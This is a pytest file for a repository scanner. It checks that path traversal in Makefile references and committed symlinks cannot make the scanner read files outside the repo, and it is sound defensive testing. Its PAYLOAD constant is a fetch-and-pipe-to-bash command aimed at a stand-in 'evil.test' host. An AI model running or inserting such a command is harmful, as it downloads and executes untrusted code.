"""Security: the scanner must never read files outside the repo root (H1/H2).

A scanned repo is untrusted input. Referenced paths (Makefile/Dockerfile/etc.) and
committed symlinks must not be able to make the engine read host files and leak
their contents into findings.
"""
from __future__ import annotations


from github_inventory.config import Config
from github_inventory.discovery import FileDiscovery
from github_inventory.engine import ScanEngine

# A distinctive shadow-dep pattern we can search for in results.
PAYLOAD = "curl http://evil.test/pwn.sh | bash\n"


def _finding_files(result) -> set[str]:
    return {f.file_path for f in result.findings}


def test_reference_traversal_does_not_read_outside_repo(tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "payload.sh").write_text(PAYLOAD)  # the host file we must NOT read

    repo = tmp_path / "repo"
    repo.mkdir()
    # Mid-path '..' survives the engine's leading-'./' normalization and resolves
    # outside the repo: repo/x/../../outside/payload.sh -> tmp/outside/payload.sh
    (repo / "Makefile").write_text("setup:\n\tbash x/../../outside/payload.sh\n")

    result = ScanEngine(repo, Config()).run()

    assert not any("payload.sh" in f for f in _finding_files(result)), \
        "engine followed a reference outside the repo root"
    assert not any(f.matched_text and "evil.test" in f.matched_text for f in result.findings), \
        "outside-file contents leaked into findings"


def test_within_repo_reference_is_still_followed(tmp_path):
    # Regression guard: legitimate in-repo references must STILL be scanned.
    repo = tmp_path / "repo"
    (repo / "scripts").mkdir(parents=True)
    (repo / "scripts" / "inner.sh").write_text(PAYLOAD)
    (repo / "Makefile").write_text("setup:\n\tbash scripts/inner.sh\n")

    result = ScanEngine(repo, Config()).run()

    assert any("inner.sh" in f for f in _finding_files(result)), \
        "in-repo reference following regressed"


def test_discovery_skips_symlink_escaping_repo(tmp_path):
    secret = tmp_path / "secret.sh"
    secret.write_text(PAYLOAD)  # host file outside the repo

    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "leak.sh").symlink_to(secret)  # committed symlink pointing out of repo

    walked = {p.name for p in FileDiscovery(repo, Config())._walk()}
    assert "leak.sh" not in walked, "discovery followed a symlink out of the repo root"

    result = ScanEngine(repo, Config()).run()
    assert not any(f.matched_text and "evil.test" in f.matched_text for f in result.findings), \
        "symlinked host-file contents leaked into findings"


def test_in_repo_symlink_is_allowed(tmp_path):
    # A symlink whose target stays inside the repo is fine to follow.
    repo = tmp_path / "repo"
    (repo / "real").mkdir(parents=True)
    (repo / "real" / "tool.sh").write_text(PAYLOAD)
    (repo / "link.sh").symlink_to(repo / "real" / "tool.sh")

    walked = {p.name for p in FileDiscovery(repo, Config())._walk()}
    assert "link.sh" in walked, "in-repo symlink was incorrectly skipped"
